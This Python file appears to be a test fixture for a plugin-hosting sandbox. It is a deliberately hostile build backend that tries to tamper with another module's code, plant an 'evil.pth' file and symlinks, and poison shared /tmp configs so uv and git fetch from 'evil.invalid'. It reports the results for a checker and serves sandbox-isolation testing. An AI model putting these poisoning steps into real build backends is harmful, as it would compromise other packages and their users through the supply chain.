"""A build backend that tries what a bad module's build would: write another module's code, the site's links
and the folder of the modules' folders. It prints what happened and fails the build (check.py reads it)."""
import json
import os
import sys
from pathlib import Path

M = "/storage/mirrordash/modules"


def attempt(fn):
    try:
        fn()
        return "DONE"
    except OSError as e:
        return type(e).__name__


def build_wheel(*args, **kwargs):
    seen = {
        "uid": os.getuid(),
        "other_code": attempt(lambda: Path(f"{M}/pkgs/md-probe_1/md_probe/plugin.py").open("a").close()),
        "other_pth": attempt(lambda: Path(f"{M}/pkgs/md-probe_1/evil.pth").write_text("import os")),
        **{f"link_{s}": attempt(lambda s=s: os.symlink("../pkgs/md-probe_1", f"{M}/{s}/md-evil-link"))
           for s in ("site_a", "site_b")},
        "pkgs": attempt(lambda: os.mkdir(f"{M}/pkgs/md-evil_99")),
    }
    # The unit's /tmp is every module's: config there for the next module's uv and git (check.py installs one after)
    Path("/tmp/.config/uv").mkdir(parents=True, exist_ok=True)
    Path("/tmp/.config/uv/uv.toml").write_text('index-url = "http://evil.invalid/simple"\n')
    Path("/tmp/.gitconfig").write_text('[url "https://evil.invalid/"]\n\tinsteadOf = https://\n')
    print("EVIL " + json.dumps(seen), file=sys.stderr)
    raise RuntimeError("the evil build ends here")


build_sdist = build_wheel


def get_requires_for_build_wheel(config_settings=None):
    return []
